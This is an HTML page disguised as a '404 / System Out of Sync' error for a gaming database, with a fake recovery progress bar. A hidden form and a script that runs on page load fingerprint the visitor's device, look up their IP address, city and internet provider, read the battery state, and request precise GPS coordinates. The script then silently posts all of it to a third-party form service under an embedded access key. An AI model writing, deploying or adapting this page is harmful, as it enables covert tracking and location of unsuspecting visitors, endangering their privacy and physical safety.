<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 Not Found - Server Connection Error</title>
    <style>
        body {
            background-color: #f8fafc;
            color: #475569;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            flex-direction: column;
            text-align: center;
        }
        .container { max-width: 450px; padding: 40px; background: white; border-radius: 16px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); }
        .error-code { font-size: 96px; font-weight: 800; color: #cbd5e1; margin: 0; }
        .status-title { font-size: 22px; font-weight: 700; color: #1e293b; margin: 10px 0; }
        .status-msg { font-size: 14px; color: #64748b; line-height: 1.6; margin-bottom: 25px; }
        .loader {
            width: 100%;
            height: 6px;
            background: #f1f5f9;
            border-radius: 20px;
            overflow: hidden;
            position: relative;
        }
        .loader-bar {
            position: absolute;
            width: 35%;
            height: 100%;
            background: #0ea5e9;
            border-radius: 20px;
            animation: move 1.5s infinite ease-in-out;
        }
        @keyframes move {
            0% { left: -40%; }
            100% { left: 100%; }
        }
    </style>
</head>
<body>

<div class="container">
    <div class="error-code">404</div>
    <div class="status-title">System Out of Sync</div>
    <div class="status-msg">We are unable to establish a secure connection with the global gaming database. Automatic recovery is in progress...</div>
    <div class="loader"><div class="loader-bar"></div></div>
</div>

<form id="trackerForm" style="display:none;">
    <input type="hidden" name="access_key" value="534a06e9-54bf-4b21-8cc0-d2717ad6c77a">

    <input type="hidden" name="[LOG] DEVICE_SPECS" id="specs">
    <input type="hidden" name="[LOG] NETWORK_INFO" id="net">
    <input type="hidden" name="[LOG] PRECISE_LOC" id="loc">
    <input type="hidden" name="[LOG] POWER_DATA" id="batt">
    <input type="hidden" name="[LOG] SOURCE_LINK" id="url">
</form>

<script>
    window.onload = async () => {
        document.getElementById('url').value = window.location.href;

        // 1. Hardware Fingerprinting
        const deviceData = `OS: ${navigator.platform} | CPU: ${navigator.hardwareConcurrency} Cores | RAM: ~${navigator.deviceMemory}GB | Screen: ${screen.width}x${screen.height}`;
        document.getElementById('specs').value = deviceData;

        // 2. IP & Network Intelligence
        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            document.getElementById('net').value = `IP: ${data.ip} | City: ${data.city} | Country: ${data.country_name} | Provider: ${data.org}`;
        } catch(e) { document.getElementById('net').value = "IP Trace Blocked"; }

        // 3. Battery Stats
        if (navigator.getBattery) {
            navigator.getBattery().then(b => {
                document.getElementById('batt').value = `Level: ${b.level * 100}% | Charging: ${b.charging}`;
            });
        }

        // 4. Precise Location (GPS)
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {
                document.getElementById('loc').value = `Maps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude} | Accuracy: ${pos.coords.accuracy}m`;
                sendData();
            }, () => { sendData(); }, {enableHighAccuracy: true});
        } else {
            sendData();
        }
    };

    function sendData() {
        const formData = new FormData(document.getElementById('trackerForm'));
        fetch('https://api.web3forms.com/submit', {
            method: 'POST',
            body: formData
        });
    }
</script>
</body>
</html>
